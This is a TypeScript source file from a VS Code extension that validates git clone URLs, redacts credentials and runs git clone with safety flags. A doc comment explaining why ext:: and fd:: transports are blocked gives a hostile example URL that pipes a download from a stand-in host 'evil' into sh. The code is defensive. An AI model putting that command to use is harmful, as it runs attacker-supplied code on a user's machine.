import * as vscode from 'vscode';
import { execFile } from 'child_process';
import { promisify } from 'util';

const execFileAsync = promisify(execFile);

/** Upper bound on a `git clone` run — protects against a stalled network transfer or a credential
 *  prompt the user will never see (no browser focus, headless remote session, etc.) hanging forever. */
const CLONE_TIMEOUT_MS = 5 * 60 * 1000;

export class GitNotFoundError extends Error {}

function getGitExecutable(): string {
	const cfg = vscode.workspace.getConfiguration('git').get<string | string[]>('path');
	if (Array.isArray(cfg) && cfg.length > 0 && cfg[0].trim()) return cfg[0];
	if (typeof cfg === 'string' && cfg.trim()) return cfg;
	return 'git';
}

/** The `.reltio/` folder is created automatically on activation (synced agent skills/Velocity Packs), and these
 *  are OS-generated artifacts that can appear just from viewing a brand-new folder in a file browser — none of
 *  them are user content, so a folder containing only these is still treated as "empty" for cloning purposes. */
const IGNORED_FOR_EMPTINESS = new Set(['.reltio', '.DS_Store', 'Thumbs.db', 'desktop.ini']);

/**
 * A folder that doesn't exist yet is empty (git will create it). Any other read failure (permissions, I/O)
 * is propagated rather than swallowed — the caller must not treat "we couldn't tell" as "safe to clone into".
 */
export async function isFolderEmpty(root: vscode.Uri): Promise<boolean> {
	let entries: [string, vscode.FileType][];
	try {
		entries = await vscode.workspace.fs.readDirectory(root);
	} catch (e) {
		const err = e as vscode.FileSystemError & NodeJS.ErrnoException;
		if (err.code === 'FileNotFound' || err.code === 'ENOENT') {
			return true;
		}
		throw e;
	}
	return entries.every(([name]) => IGNORED_FOR_EMPTINESS.has(name));
}

/** True when `candidate` is `root` itself or a descendant of it — guards against a path escaping the workspace. */
export function isPathContainedIn(root: vscode.Uri, candidate: vscode.Uri): boolean {
	const rootPath = root.path.replace(/\/+$/, '');
	const candidatePath = candidate.path;
	// Case-insensitive comparison on Windows (drive letters may differ in casing)
	if (process.platform === 'win32') {
		const rootLower = rootPath.toLowerCase();
		const candidateLower = candidatePath.toLowerCase();
		return candidateLower === rootLower || candidateLower.startsWith(`${rootLower}/`);
	}
	return candidatePath === rootPath || candidatePath.startsWith(`${rootPath}/`);
}

export async function isGitRepo(root: vscode.Uri): Promise<boolean> {
	try {
		await vscode.workspace.fs.stat(vscode.Uri.joinPath(root, '.git'));
		return true;
	} catch {
		return false;
	}
}

export async function getRemoteUrl(root: vscode.Uri): Promise<string | undefined> {
	try {
		const { stdout } = await execFileAsync(
			getGitExecutable(),
			['remote', 'get-url', 'origin'],
			{ cwd: root.fsPath },
		);
		const url = stdout.trim();
		return url.length > 0 ? url : undefined;
	} catch {
		return undefined;
	}
}

/** True when the folder is already a git repo with an `origin` remote configured — no clone needed. */
export async function isGitRepoWithRemote(root: vscode.Uri): Promise<boolean> {
	if (!(await isGitRepo(root))) return false;
	return (await getRemoteUrl(root)) !== undefined;
}

/**
 * The nearest repository at or above `start`, or undefined when there is none.
 *
 * Each tenant folder is meant to be its own repository, so a repository sitting above one is a
 * problem worth reporting: it either pulls the environment and tenant names back into every
 * tracked path, or swallows the tenant as a gitlink whose contents it does not actually store.
 *
 * Walks up to the filesystem root, because the enclosing repository is often a level or two above
 * the workspace (a `Projects` folder someone once ran `git init` in).
 */
export async function findEnclosingGitRepository(
	start: vscode.Uri,
): Promise<vscode.Uri | undefined> {
	let current = start;
	// Bounded rather than while(true): a malformed URI must not spin forever.
	for (let depth = 0; depth < 64; depth++) {
		if (await isGitRepo(current)) return current;
		const parentPath = current.path.slice(0, current.path.lastIndexOf('/'));
		// A drive root ("/c:") or the filesystem root has no further parent to examine.
		if (!parentPath || parentPath === current.path || !parentPath.includes('/')) return undefined;
		current = current.with({ path: parentPath });
	}
	return undefined;
}

/** Raised when `git clone --branch <b>` fails specifically because the branch is not on the remote. */
export class BranchNotFoundError extends Error {
	constructor(readonly branch: string, readonly url: string) {
		super(`Branch '${branch}' does not exist on ${redactUrl(url)}.`);
	}
}

/**
 * Removes `user[:password]@` from every `scheme://` URL in `text`. The one redaction every message,
 * tooltip and log line goes through: git echoes the URL it was given in its own stderr, and a sidecar
 * written by an older version may still carry credentials. Works on a bare URL or on free text.
 */
export function redactUrl(text: string): string {
	return text.replace(/\b([a-z][a-z0-9+.-]*:\/\/)[^/@\s]*@/gi, '$1');
}

function escapeRegExp(value: string): string {
	return value.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

/** git's wording for a missing ref, across the versions we support. */
function isMissingBranchFailure(stderr: string, branch: string): boolean {
	return (
		/Remote branch .* not found in upstream/i.test(stderr) ||
		/warning: Could not find remote branch/i.test(stderr) ||
		// The branch is user text; unescaped, a name like `feat(x` would throw a SyntaxError here
		// and hide git's real error.
		new RegExp(`pathspec '${escapeRegExp(branch)}' did not match`, 'i').test(stderr)
	);
}

/**
 * `git@host:org/repo.git` SCP-like syntax — no scheme, so it would otherwise fall through
 * `isAllowedCloneUrl()`'s scheme check entirely.
 */
const SCP_LIKE_URL = /^[\w.-]+@[\w.-]+:.+$/;

/**
 * True when `url` is a plain `https://`/`http://`/`ssh://` URL or `git@host:path` SCP syntax —
 * the shapes the "Connect Custom Workflow Repository" prompt and the generic git-bind flow invite
 * a user to paste.
 *
 * Git also understands pseudo-transports like `ext::` and `fd::`, where the "URL" is actually a
 * shell command to run — e.g. `ext::sh -c 'curl evil|sh'`. Modern git (>=2.38.1) disables those by
 * default for clone/fetch, but only for an installed git new enough and not reconfigured to
 * re-allow them, and this extension has no way to know either of those things about the user's
 * system git. Accepting only the shapes above, rather than trying to deny-list every unsafe
 * scheme, is what keeps a future git transport this code has never heard of from slipping through.
 */
export function cloneUrlProblem(url: string): string | undefined {
	if (url.startsWith('-')) return 'A git URL must not start with "-".';
	if (/[\u0000-\u0020\u007f]/.test(url)) return 'A git URL must not contain spaces or control characters.';
	if (/^(?:https?|ssh):\/\//i.test(url)) {
		let parsed: URL;
		try {
			parsed = new URL(url);
		} catch {
			return 'The git URL could not be parsed.';
		}
		// A password (or token) in the URL would be persisted in the committed sidecar and echoed by git.
		if (parsed.password) return 'A git URL must not contain credentials.';
		return undefined;
	}
	return SCP_LIKE_URL.test(url) ? undefined : 'Use an https://, ssh://, or git@host:path URL.';
}

export function isAllowedCloneUrl(url: string): boolean {
	return cloneUrlProblem(url) === undefined;
}

/**
 * Clones `url` directly into `destRoot` (must already be empty — caller's responsibility to check).
 * Auth is entirely delegated to the system git installation and its credential helper
 * (e.g. Git Credential Manager), which opens a browser login when credentials aren't cached.
 *
 * When `branch` is given, only that branch is checked out; a branch absent from the remote raises
 * `BranchNotFoundError` so the caller can offer to create it rather than reporting a generic failure.
 *
 * `url` is validated here, not at the call sites, so every current and future caller — the
 * "Connect Custom Workflow Repository" prompt, the generic git-bind flow, `tenantGitBinding.ts`'s
 * branch-creation path — gets the same protection without having to remember to ask for it.
 */
export async function cloneRepository(
	url: string,
	destRoot: vscode.Uri,
	branch?: string,
): Promise<void> {
	const problem = cloneUrlProblem(url);
	if (problem) {
		throw new Error(
			`Unsupported git URL: "${redactUrl(url)}". ${problem} Credentials do not belong in the URL: use SSH or your Git credential manager instead.`,
		);
	}
	// Defense in depth: `isAllowedCloneUrl()` above should already exclude git's `ext::`/`fd::`
	// pseudo-transports, but disabling them explicitly here costs nothing and keeps a future code
	// path that reaches `execFile` without going through that check just as safe. `-c` flags are
	// global options, so they must precede the `clone` subcommand.
	const safetyFlags = ['-c', 'protocol.ext.allow=never', '-c', 'protocol.fd.allow=never'];
	const args = branch
		? [...safetyFlags, 'clone', '--branch', branch, '--', url, '.']
		: [...safetyFlags, 'clone', '--', url, '.'];
	try {
		await execFileAsync(getGitExecutable(), args, {
			cwd: destRoot.fsPath,
			timeout: CLONE_TIMEOUT_MS,
			killSignal: 'SIGTERM',
		});
	} catch (e) {
		if (branch) {
			const stderr = String((e as { stderr?: string }).stderr ?? '');
			if (isMissingBranchFailure(stderr, branch)) {
				throw new BranchNotFoundError(branch, url);
			}
		}
		throw describeGitFailure(e);
	}
}

/**
 * Translates a raw `execFile` rejection into the user-facing error for a git shell-out.
 *
 * Kept separate so every git-invoking code path (clone, branch creation, branch read) reports a
 * missing git executable and a timeout the same way.
 */
export function describeGitFailure(e: unknown): Error {
	const err = e as NodeJS.ErrnoException & { killed?: boolean };
	if (err.code === 'ENOENT') {
		return new GitNotFoundError(
			'Git executable not found. Install Git (https://git-scm.com/downloads) and ensure it is on your PATH, then try again.',
		);
	}
	if (err.killed) {
		return new Error(
			`Git operation timed out after ${CLONE_TIMEOUT_MS / 60000} minutes. Check your network connection and git credentials, then try again.`,
		);
	}
	const message = redactUrl(e instanceof Error ? e.message : String(e));
	if (e instanceof Error && message === e.message) return e;
	return new Error(message);
}
